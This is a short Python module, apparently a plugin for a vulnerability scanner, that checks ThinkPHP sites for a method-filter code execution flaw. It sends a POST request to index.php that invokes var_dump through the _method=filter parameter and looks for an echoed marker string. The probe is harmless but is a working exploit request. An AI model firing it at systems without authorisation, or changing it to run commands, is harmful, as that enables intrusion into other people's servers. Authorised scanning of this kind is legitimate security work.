"""  
@Time: 2024/2/28 16:41 
@Auth: Y5neKO
@File: Thinkphp_method_filter_code_exec.py 
@IDE: PyCharm 
"""
import requests
import urllib.parse


def run(url, timeout):
    result = {
        'name': 'Thinkphp_method_filter_code_exec',
        'vulnerable': False,
        'method': None,
        'url': None,
        'payload': None
    }
    headers = {
        "User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
    }
    payload = {
        'c': 'var_dump',
        'f': '4e5e5d7364f443e28fbf0d3ae744a59a',
        '_method': 'filter',
    }
    try:
        vurl = urllib.parse.urljoin(url, 'index.php')
        req = requests.post(vurl, data=payload, headers=headers, timeout=timeout, verify=False)
        if "4e5e5d7364f443e28fbf0d3ae744a59a" in req.text and 'var_dump' not in req.text:
            result['vulnerable'] = True
            result['method'] = 'POST'
            result['url'] = vurl
            result['position'] = 'data'
            result['payload'] = payload
        return result
    except Exception as e:
        print(e)
        return result
